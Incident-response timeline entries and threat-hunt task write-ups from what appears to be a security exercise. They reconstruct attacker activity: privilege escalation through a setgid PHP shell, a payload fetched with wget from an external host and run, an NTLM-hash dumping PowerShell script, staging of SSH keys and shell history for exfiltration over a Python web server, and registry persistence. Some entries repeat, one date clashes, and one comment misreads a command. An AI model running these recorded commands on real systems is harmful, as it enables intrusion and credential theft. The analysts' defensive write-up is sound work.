timeline.event_title: rangers-nix-fs has suspicious activity configuring web services
timeline.event_content:
We see the first command run on box to change the root password (executed as root):

Apr 4, 2024 @ 13:20:27.874
passwd

See the attached query for all the commands being run with timestamps. Things of note that we see happen:

Apr 4, 2024 @ 13:20:27.874
# changes the root password and then puts the webuser into the sudo group, allowing the web service to run commands as root using sudo
$ passwd 
$ gpasswd -d webuser sudo 

Apr 4, 2024 @ 13:33:26.318
# stopping and disabling, and then starting up apache looks like they're changing who is hosting the web root from nginx to apache. Malicous actor is probs just more familiar with Apache to serve pages
$ sudo service nginx stop 
$ sudo systemctl disable nginx 

Apr 4, 2024 @ 13:33:26.318
# removal of .htaccess file in root directory allows all web requests without authentication that are being served by Apache
$ sudo rm /var/www/html/.htaccess 
$ sudo service apache2 restart 

Apr 4, 2024 @ 17:15:43.081
# sets owner of python to root and does setguid bit on file means that python will always be run as root user
$ sudo chown root:root /usr/bin/python3.10
$ sudo chmod 2755 /usr/bin/python3.10 

Apr 5, 2024 @ 04:09:53.863
# drops into mysql prompt as root user. Can't see what he did, but it can't be good
$ sudo mysql -u root 

Apr 4, 2024 @ 21:59:26.827
# setting up wordpress exploit
$ sudo nano /srv/www/wordpress/wp-config.php
$ sudo chmod 664 /srv/www/wordpress/wp-config.php
$ sudo chgrp www-data /usr/bin/php8.1
$ sudo chmod g+s /usr/bin/php8.1
$ sudo chmod u-s /usr/bin/python3.10
$ sudo chmod g-s /usr/bin/python3.10

Apr 5, 2024 @ 04:17:25.596
# Starting up mysql server
$ systemctl start mysql.service

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.

timeline.event_title: rangers-dc Administrator ran the scrape.ps1 Powershell script
timeline.event_content:
The Administrator account on rangers-dc ran a Powershell script several times. The script queries for all domain users and their associated NTLM hashes, outputting them to the scrape.txt file.

The script was ran six times all within 10min.
timeline.event_raw:
Creating Scriptblock text (1 of 1):
# PowerShell script that pulls all users accounts/NTLM hashes

# Import Active Directory module
Import-Module ActiveDirectory

# Retrieve all user accounts and their properties
$users = Get-ADUser -Filter * -Properties *

# Output user account information to file
$users | Select-Object Name, SamAccountName, UserPrincipalName, Enabled, PasswordLastSet, @{Name="NTLMHash"; Expression={$_. 'msDS-NTLMHash' | Out-String}} | Out-File -FilePath scraped.txt



ScriptBlock ID: 57b9e51e-260d-405c-8dbb-36d9b6613738
Path: C:\Users\Administrator\Desktop\scrape.ps1

timeline.event_title: rangers-apache SSH started from 200.200.200.121
timeline.event_content:
We see the disconnect from the external host:
```
Disconnected from user webuser 200.200.200.121 port 33088
```

The the previous seen log for webuser was this event:
```
pam_unix(sshd:session): session opened for user webuser(uid=1000) by (uid=0)
New session 95 of user webuser.
```

Thus we deduced that this is the start and finish of the sesion. We also used an analsis for sysmon logs for terminal session 95
https://kibana.lan/goto/2b875460-73a6-11f0-9e5a-85ef666a4f46

timeline.event_title: Rangers-nix-fs pwned via ssh
timeline.event_content:
Per NA, we see an SSH connection to the box 3 times between 13:05:02 - 13:08:53

We then see the first command run on box to change the root password (executed as root):

Apr 4, 2024 @ 13:20:27.874
passwd

See the attached query for all the commands being run with timestamps. Things of note that we see happen:

Apr 4, 2024 @ 13:20:27.874
# changes the root password and then puts the webuser into the sudo group, allowing the web service to run commands as root using sudo
$ passwd 
$ gpasswd -d webuser sudo 

Apr 4, 2024 @ 13:33:26.318
# stopping and disabling, and then starting up apache looks like they're changing who is hosting the web root from nginx to apache. Malicous actor is probs just more familiar with Apache to serve pages
$ sudo service nginx stop 
$ sudo systemctl disable nginx 

Apr 4, 2024 @ 13:33:26.318
# removal of .htaccess file in root directory allows all web requests without authentication that are being served by Apache
$ sudo rm /var/www/html/.htaccess 
$ sudo service apache2 restart 

Apr 4, 2024 @ 17:15:43.081
# sets owner of python to root and does setguid bit on file means that python will always be run as root user
$ sudo chown root:root /usr/bin/python3.10
$ sudo chmod 2755 /usr/bin/python3.10 

Apr 5, 2024 @ 04:09:53.863
# drops into mysql prompt as root user. Can't see what he did, but it can't be good
$ sudo mysql -u root 

Apr 4, 2024 @ 21:59:26.827
# setting up wordpress exploit
$ sudo nano /srv/www/wordpress/wp-config.php
$ sudo chmod 664 /srv/www/wordpress/wp-config.php
$ sudo chgrp www-data /usr/bin/php8.1
$ sudo chmod g+s /usr/bin/php8.1
$ sudo chmod u-s /usr/bin/python3.10
$ sudo chmod g-s /usr/bin/python3.10

Apr 5, 2024 @ 04:17:25.596
# Starting up mysql server
$ systemctl start mysql.service

Apr 5, 2024 @ 13:36:35.496
# downloading ybin, Might be a simple data encrypter using AES256?
$ /usr/bin/php8.1 -r pcntl_exec('/bin/sh', ['-p']);
$ sudo wget 200.200.200.121:6060/ybin
$ mv ybin /var/log/ybin
$ chmod +x /var/log/ybin
$ ./ybin

Apr 5, 2024 @ 13:58:58.548
# creation and use of gith script
# https://kibana.lan/goto/e8e6a580-7390-11f0-9e5a-85ef666a4f46
$ nano /usr/bin/git # oops lol
$ nano /usr/bin/gith
$ chmod +x /usr/bin/gith
$ crontab -e
$ python3 -m gith 8077
$ python3 gith 8050
$ python3 gith 80
$ python3 gith 8040

Apr 5, 2024 @ 15:57:53.261
# It appears the gith server failed, so they bad guy switched to hosting using the simple python web server that served the directory
$ python3 -m http.server 7070 --directory /home/webuser
$ nano collect.sh
$ crontab -e
$ mv collect.sh collect/collect.sh
$ chmod +x collect.sh
$ /bin/bash ./collect.sh
$ mktemp -d
$ find . -type f -exec cp --parents {} /tmp/tmp.PAGUWivSUG ;
$ date +%Y-%m-%d_%H-%M-%S
$ mv webuser_2024-04-05_16-15-16.zip /var/log/collect
$ rm -rf /tmp/tmp.PAGUWivSUG
$ nano collect.sh
$ chmod +x collect.sh
$ /bin/bash ./collect.sh
$ mktemp -d
$ find . -maxdepth 1 -type f -exec cp {} /tmp/tmp.npLocJdos8 ;
$ date +%Y-%m-%d_%H-%M-%S
$ tar -czf webuser_2024-04-05_16-19-46.tar.gz ./ca.crt /bin/bash
$ mv webuser_2024-04-05_16-19-46.tar.gz /var/log/collec

`cp --parents ./.profile /tmp/tmp.PAGUWivSUG`  
`cp --parents ./ca.crt /tmp/tmp.PAGUWivSUG`  
`cp --parents ./.sudo_as_admin_successful /tmp/tmp.PAGUWivSUG`  
`cp --parents ./.cache/motd.legal-displayed /tmp/tmp.PAGUWivSUG`  
`cp --parents ./.ssh/authorized_keys /tmp/tmp.PAGUWivSUG`  
`cp --parents ./.bash_history /tmp/tmp.PAGUWivSUG`  
`cp --parents ./.selected_editor /tmp/tmp.PAGUWivSUG`  
`cp --parents ./.bash_logout /tmp/tmp.PAGUWivSUG`  
`date +%Y-%m-%d_%H-%M-%S`  
`mv webuser_2024-04-05_16-15-16.zip /var/log/collect`

timeline.event_title: rangers-apache SSH ended from 200.200.200.121
timeline.event_content:
We see the disconnect from the external host:
```
Disconnected from user webuser 200.200.200.121 port 33088
```

The the previous seen log for webuser was this event:
```
pam_unix(sshd:session): session opened for user webuser(uid=1000) by (uid=0)
New session 95 of user webuser.
```

Thus we deduced that this is the start and finish of the sesion. We also used an analsis for sysmon logs for terminal session 95
https://kibana.lan/goto/2b875460-73a6-11f0-9e5a-85ef666a4f46

tasks.task_title: TTT18.06 HOST (Dolifka) - Follow process chain on the Firefox process that created Install.exe
tasks.task_description:
### Overview



### Methodology



Potential Hardening Recommendations:
- 










(Place any improvements or updated instructions/tips/strategies for completing this task in the future into the OVERVIEW section - above this line BEFORE the Event Collected section. All other changes will be sanitized and lost when this task is re-imported.)

### Event Collected/Used: 

Winlogbeat sysmon logs

### Query/Actions:

Lucene/Arkime Query:

===== Using Winlogbeat-2025 =====

`(\*.entity_id:("{fd279567-b5f5-660e-661f-000000002500}" OR "{fd279567-b60a-660e-6b1f-000000002500}" OR "{fd279567-b5f9-660e-671f-000000002500}" OR "{fd279567-b5fb-660e-681f-000000002500}" OR "{fd279567-b608-660e-6a1f-000000002500}" OR "{fd279567-493e-660f-5800-000000002700}")) AND NOT process.command_line:(appomni OR UpdateShortcutAppUserModelIds OR *-greomni* OR WerFault.exe) AND NOT process.executable:helper.exe AND NOT file.extension:dmp AND NOT dns.question.registered_domain: (cloudflare.net OR google.com) AND NOT event.code:8`

### Timeline of events

Host "rng-win10-1-1"
1. **Apr 4, 2024 @ 14:15:17.970** A scheduled task runs "Firefox.exe" (PID 1292)
2. **Apr 4, 2024 @ 14:15:36.628** A scheduled task runs "Firefox.exe" (PID 8424)
3. **Apr 5, 2024 @ 00:43:42.647** A scheduled task runs "Firefox.exe" (PID 3908)
4. **Apr 5, 2024 @ 00:44:15.531** PID 3908 makes a DNS query to "www.iiu.edu.pk", IP address "200.200.200.121"
5. **Apr 5, 2024 @ 00:45:15.595** PID 3908 makes a DNS query to "www.guardia.mil.ve", IP address "200.200.200.121"
6. **Apr 5, 2024 @ 00:46:15.610** PID 3908 makes a DNS query to "www.germanculture.com.ua", IP address "200.200.200.121"
7. **Apr 5, 2024 @ 00:46:15.706** PID 3908 makes a DNS query to "government-records.com", IP address "200.200.200.121"
8. **Aug 3, 2025 @ 17:34:35.985** PID 3908 creates file "Install.exe" in "C:\Users\keri.kline\AppData\Local\Temp\$77"
9. **Apr 5, 2024 @ 00:59:07.869** An encoded Powershell ran, parent is PID 3908
    - Decoded Command: `Set-ItemProperty -Path "C:\Users\keri.kline\AppData\Local\Temp\$77" -Name LastWriteTime -Value "02/21/2021 15:38:44"`
10. **Apr 5, 2024 @ 00:59:49.107** An encoded Powershell ran, parent is PID 3908
    - Decoded Command: `Set-ItemProperty -Path "C:\Users\keri.kline\AppData\Local\Temp\$77\Install.exe" -Name LastWriteTime -Value "02/21/2021 15:38:44"`
11. **Apr 5, 2024 @ 01:00:59.925** An encoded Powershell ran, parent is PID 3908
    - Decoded Command: `Set-ItemProperty -Path "C:\Users\keri.kline\AppData\Local\Temp\$77\Install.exe" -Name LastWriteTime -Value "02/21/2021 15:38:44"`
12. **Apr 5, 2024 @ 01:03:27.971** An encoded Powershell ran, parent is PID 3908
    - Decoded Command: `Set-ItemProperty -Path "C:\Users\keri.kline\AppData\Local\Temp\$77\Install.exe" -Name LastWriteTime -Value "02/21/2021 15:38:44"`
13. **Apr 5, 2024 @ 01:04:09.182** "Install.exe" creates a process, indicating execution (parent PID 3908)
14. **Apr 5, 2024 @ 01:25:08.080** A registry key is added via "cmd.exe" (parent PID 3908). Command: `C:\Windows\system32\cmd.exe /C reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CachedLogonsCount /t REG_SZ /d 50 /f`. Translated, this updates the Windows logon subsystem so that up to 50 user credentials are stored locally.
15. **Apr 5, 2024 @ 01:27:26.486** Queries for a registry key via "cmd.exe" (parent PID 3908). Command: `C:\Windows\system32\cmd.exe /C reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CachedLogonsCount`
16. **Apr 5, 2024 @ 16:29:07.424** Parent PID 3908 added registry key via `reg add "HKLM\SOFTWARE\$77config\startup" /f`
17. **Apr 5, 2024 @ 16:32:30.679** Parent PID 3908 added registry key via `reg add "HKLM\SOFTWARE\$77config\tcp_remote" /f`
18. **Apr 5, 2024 @ 16:32:57.011** Parent PID 3908 added registry key via `reg add "HKLM\SOFTWARE\$77config\tcp_remote" /v "8080" /t REG_DWORD /d 8080 /f`
19. **Apr 5, 2024 @ 16:35:06.781** Parent PID 3908 added registry key via `reg add "HKLM\SOFTWARE\$77config\startup" /v sysdbg //d "C:\Program Files\Mozilla Firefox\dbghelp.dll" /f`

**Summary:** "Install.exe" was likely downloaded from the malicious domains, then performs timestomping to hide itself. "Install.exe" tried establishing persistence via setting a registry key, likely to to open a TCP remote connection on 8080 on startup. However, the arguemnt for `reg add "HKLM\SOFTWARE\$77config\startup" /v sysdbg //d "C:\Program Files\Mozilla Firefox\dbghelp.dll" /f` is invalid, as it contains `//d` instead of `/d'.`

### Result Link:

[Process chain](https://kibana.lan/goto/aad741f0-73a4-11f0-9e5a-85ef666a4f46)

### Disposition:

(select one)
- [ ] NONE - No results found using this query for this technique
- [ ] BENIGN - All of the resulting records are normal/benign activity
- [ ] SUSPICIOUS - Some/all of the resulting records are not normal/ubiquitous and require further investigation
- [x] MALICIOUS - Some/all of the resulting records are clearly malicious in nature and this host should be considered compromised
- [ ] N/A - Disposition does not apply to Characterization Tasks  SUSPICIOUS

### Justification:

- Reached out to bad domains.
- Performed timestomping to hide presence.
- Added registry keys to establish persistence.
- Modified registry key in an attempt to enable credential harvesting.
- Attempted to hide malicious file in `C:\Program Files\Mozilla Firefox`, likely to trick others into thinking it's a DLL for Firefox.

### Enable hardening recommendation:

- Collect malicious "install.exe" and "dbghelp.dll" for forensics, then delete.
- Block malicious domains.
- Remove registry key edits.
- Block users from running CMD.
- Block execution of programs from User directories.
- Change Powershell to constrained mode for user accounts.
- Implement whitelisting for applications.

### Successes:

(List things that worked well while completing this task)

tasks.task_title: TTT200.202 - HOST (Ayon) discovery commands on linux servers
tasks.task_description:
### Overview Locate malicious activity through CommandLine and Image fields. Pivot on discovered activity to identify discovery commands. ### Methodology ``` hostname: AND User: AND CommandLine: (locale OR ls OR find OR locate OR which OR whereis OR file OR uname OR lscpu OR lsblk OR lsusb OR dmidecode OR whoami OR id OR hwinfo) ``` (Place any improvements or updated instructions/tips/strategies for completing this task in the future into the OVERVIEW section - above this line BEFORE the Event Collected section. All other changes will be sanitized and lost when this task is re-imported.) ### Event Collected/Used: linux-syslog ### Query/Actions: Lucene/Arkime Query: ``` hostname: AND User: AND CommandLine: (locale OR ls OR find OR locate OR which OR whereis OR file OR uname OR lscpu OR lsblk OR lsusb OR dmidecode OR whoami OR id OR hwinfo) ``` ``` hostname: rangers-apache AND NOT CommandLine: (ansible OR sleep OR sftp OR lname OR pidof OR foreign OR SysMonLinux OR enrollment OR restart OR elastic OR dpkg OR version OR snapd OR global OR generator OR save_handler OR n" OR save_path OR gc_maxlifetime or mindepth OR landscape OR motd OR fsck) ``` ``` hostname: rangers-apache AND CommandLine: rm AND User: webuser AND NOT CommandLine: ansible ``` ### Result Link: - [rangers-apache discovery commands](https://kibana.lan/goto/aa8606f0-739f-11f0-9e5a-85ef666a4f46) - [Rangers Share Folders.zip activity](https://kibana.lan/goto/abbf4940-73aa-11f0-9e5a-85ef666a4f46) - [usage of "ls --color=auto"](https://kibana.lan/goto/662ff960-73aa-11f0-9e5a-85ef666a4f46) Time | Host | User | CmdLine -----|------|------|--------- Apr 4, 2024 @ 13:15:58.995 | rangers-apache | webuser | /usr/bin/locale-check C.UTF-8 Apr 4, 2024 @ 13:15:59.077 | rangers-apache | webuser | locale Apr 5, 2024 @ 03:24:19.229 | rangers-apache | webuser | /usr/bin/locale-check C.UTF-8 Apr 5, 2024 @ 03:24:19.274 | rangers-apache |webuser | locale Apr 5, 2024 @ 03:29:18.470 | rangers-apache | webuser | ls --color=auto -la /usr/bin/python3.10 Apr 5, 2024 @ 03:29:48.606 | rangers-apache | webuser | id Apr 5, 2024 @ 03:30:12.411 | rangers-apache | webuser | whoami
Time | Host | User | CmdLine | CurrentDirectory -----|------|------|---------|------- Apr 3, 2024 @ 17:57:08.189 | rangers-apache | webuser | rm Rangers Share Folders.zip | /home/webuser Apr 3, 2024 @ 17:57:59.072 | rangers-apache | webuser | unzip Rangers Share Folders.zip -d / | /home/webuser Apr 3, 2024 @ 17:58:04.732 | rangers-apache | webuser | sudo unzip Rangers Share Folders.zip -d / |/home/webuser Apr 3, 2024 @ 17:58:10.273 | rangers-apache | root | unzip Rangers Share Folders.zip -d / | /home/webuser ### Disposition: (select one) - [ ] NONE - No results found using this query for this technique - [ ] BENIGN - All of the resulting records are normal/benign activity - [ ] SUSPICIOUS - Some/all of the resulting records are not normal/ubiquitous and require further investigation - [X] MALICIOUS - Some/all of the resulting records are clearly malicious in nature and this host should be considered compromised - [ ] N/A - Disposition does not apply to Characterization Tasks SUSPICIOUS ### Justification: The initial discovery commands are malicious. The manipulation of "Rangers Share Folders.zip" appears to be benign. The activity is confusing as webuser is considered compromised by day 5. However, Activity before day 5 appears to be range admins acting IAW their duties. ### Enable hardening recommendation: Webuser account - Redo user awareness training, conduct internal phishing campaigns Application whitelisting ### Successes: After filtering out known/suspected good commandlines I was able to identify commandlines from webuser that appear to be malicious. ### Challenges/Opportunities to improve: webuser appears to be used by range admins to perform setup activities during the first day of the vuln window. The commandline "ls --color=auto" is used during the execution of ybin and gith however it is also used during the first day of the vuln window when our initial infection, allegedly, hasn't even taken place yet.



### Result Link:
https://kibana.lan/goto/08bf41d0-73a7-11f0-9e5a-85ef666a4f46

### Justification:


We see the disconnect from the external host:
```
Disconnected from user webuser 200.200.200.121 port 33088
```

The the previous seen log for webuser was this event:
```
pam_unix(sshd:session): session opened for user webuser(uid=1000) by (uid=0)
New session 95 of user webuser.
```

Thus we deduced that this is the start and finish of the sesion. We also used an analsis for sysmon logs for terminal session 95

Disable SSH external access to internal hosts

Able to correlate the command that we saw run, to an SSH connecction that was made

All other changes will be sanitized and lost when this task is re-imported.) ### Event Collected/Used: linux-sysmon* ### Query/Actions: `collect.sh` `http.server` ### Result Link: [collect.sh script activity](https://kibana.lan/goto/61b65d90-72f9-11f0-9e5a-85ef666a4f46) Time | CommandLine -----|------------------ Apr 5, 2024 @ 16:15:16.329 | rm -rf /tmp/tmp.PAGUWivSUG Apr 5, 2024 @ 16:15:16.327 | mv webuser_2024-04-05_16-15-16.zip /var/log/collect Apr 5, 2024 @ 16:15:16.273 | date +%Y-%m-%d_%H-%M-%S Apr 5, 2024 @ 16:15:16.246 | cp --parents ./.bash_logout /tmp/tmp.PAGUWivSUG Apr 5, 2024 @ 16:15:16.219 | cp --parents ./.selected_editor /tmp/tmp.PAGUWivSUG Apr 5, 2024 @ 16:15:13.596 | cp --parents ./.bash_history /tmp/tmp.PAGUWivSUG Apr 5, 2024 @ 16:15:13.594 | cp --parents ./.ssh/authorized_keys /tmp/tmp.PAGUWivSUG Apr 5, 2024 @ 16:15:01.080 | cp --parents ./.cache/motd.legal-displayed /tmp/tmp.PAGUWivSUG Apr 5, 2024 @ 16:15:01.079 | cp --parents ./.sudo_as_admin_successful /tmp/tmp.PAGUWivSUG Apr 5, 2024 @ 16:15:01.078 | cp --parents ./ca.crt /tmp/tmp.PAGUWivSUG Apr 5, 2024 @ 16:15:01.076 | cp --parents ./.profile /tmp/tmp.PAGUWivSUG Apr 5, 2024 @ 16:15:01.073 | cp --parents ./.viminfo /tmp/tmp.PAGUWivSUG Apr 5, 2024 @ 16:15:01.072 | find . -type f -exec cp --parents {} /tmp/tmp.PAGUWivSUG ; Apr 5, 2024 @ 16:15:01.071 | mktemp -d Apr 5, 2024 @ 16:15:01.069 | /bin/bash ./collect.sh Apr 5, 2024 @ 16:14:58.415 | chmod +x collect.sh
[collect.sh execution times](https://kibana.lan/goto/4eecf2a0-72f9-11f0-9e5a-85ef666a4f46) Execution times: Apr 5, 2024 @ 16:15:01.069 - /bin/bash ./collect.sh Apr 5, 2024 @ 16:19:46.289 - /bin/bash ./collect.sh Apr 5, 2024 @ 18:00:01.671 - /bin/bash /var/log/collect/collect.sh Apr 5, 2024 @ 21:00:01.691 - /bin/bash /var/log/collect/collect.sh Apr 6, 2024 @ 00:00:01.634 - /bin/bash /var/log/collect/collect.sh Apr 6, 2024 @ 03:00:01.518 - /bin/bash /var/log/collect/collect.sh
[python3 server commandlines](https://kibana.lan/goto/368f4eb0-72f9-11f0-9e5a-85ef666a4f46) Time | CommandLine -----|------------- Apr 5, 2024 @ 16:23:34.847 | python3 -m http.server 7070 --directory /var/log/collect | /var/log/collect Apr 5, 2024 @ 15:57:53.261 | python3 -m http.server 7070 --directory /home/webuser | /usr/bin Apr 5, 2024 @ 15:08:46.456 | python3 -m http.server 7070 | /home/webuser ### Disposition: (select one) - [ ] NONE - No results found using this query for this technique - [ ] BENIGN - All of the resulting records are normal/benign activity - [ ] SUSPICIOUS - Some/all of the resulting records are not normal/ubiquitous and require further investigation - [X] MALICIOUS - Some/all of the resulting records are clearly malicious in nature and this host should be considered compromised - [ ] N/A - Disposition does not apply to Characterization Tasks SUSPICIOUS ### Justification: collect.sh commandlines can be seen collecting local host information and outputing to a file within a directory that is then served up on a python3 webserver. ### Enable hardening recommendation: At this point all activity is being done as root or webuser. The attacker is swapping between the two accounts whenever necessary. I can suggest to disallow the creation of python3 webservers on this account, but that may be a feature useful to admins. At this point fire the admins and get new ones because this is a mess. Attack Surface Reduction policy to prevent execution of binaries from user-profile. ### Successes: Using the "view surrounding documents" feature on kibana was incredibly helpful in identifying the behavior surrounding "collect.sh". This is a feature that is underutilized by me; I will be sure to utilize it more in the future. ### Challenges/Opportunities to improve: An opportunity to improve is to use the processguid and parentprocessguid more often. I got very tunnel visioned when it came to looking at surrounding documents. Ultimately this is how I got the information, but I may have missed something or been able to search more accurately using the guid fields.

firefox uninstall helper.exe updateshortcutappusermodelids is a command-line utility within the Firefox installer that assists with maintaining Windows shortcuts.

firefox uninstall helper.exe: This refers to the executable file used for uninstalling and other maintenance tasks related to Firefox installations on Windows.
